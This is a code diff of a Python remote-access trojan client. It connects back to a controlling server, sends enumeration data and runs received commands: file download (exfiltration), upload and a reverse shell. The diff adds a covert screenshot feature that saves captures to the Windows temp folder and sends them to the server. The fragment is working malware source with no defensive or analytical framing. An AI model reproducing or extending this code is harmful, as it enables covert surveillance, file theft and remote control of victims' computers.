@@ -22,14 +22,14 @@ s.send(str(enume()).encode())
 
 print("[+] Connected to server")
 
-def download(from_):
-    from_ = s.recv(1024).decode()
-    file = open(from_, 'rb')
+def download(file_path):
+    # file_path_ = s.recv(4096).decode()
+    file = open(file_path, 'rb')
     a = file.read(4096)
     while a:
         s.send(a)
         a = file.read(4096)
-    time.sleep(0.3)
+    time.sleep(1)
     s.send(b"\n\r")
     file.close()
 
@@ -81,6 +81,23 @@ def rev_shell(socket):
     except KeyboardInterrupt:
         s.close()
 
+
+def ss():
+    import pyautogui
+    my_screenshot = pyautogui.screenshot()
+    file_name = "screenshoot_" + time.ctime().split()[3].replace(':', '-') + '.png'
+
+    path = "C:\\Windows\\Temp\\" + file_name
+
+    my_screenshot.save(path)
+    time.sleep(2)
+    
+    s.send(path.encode())
+    print("PATH SENT!")
+
+    download(file_path=path)
+
+
 while 1:
     command = s.recv(409600).decode()
     print(command)
@@ -88,13 +105,13 @@ while 1:
 
     match command[0]:
         case 'download':
-            download(from_= command[1])
+            download(file_path=command[1])
         case 'upload':
             upload()
         case 'shell':
-            print("line 93")
             time.sleep(1)
             rev_shell(socket=s)
-
+        case 'ss':
+            ss()
 
 
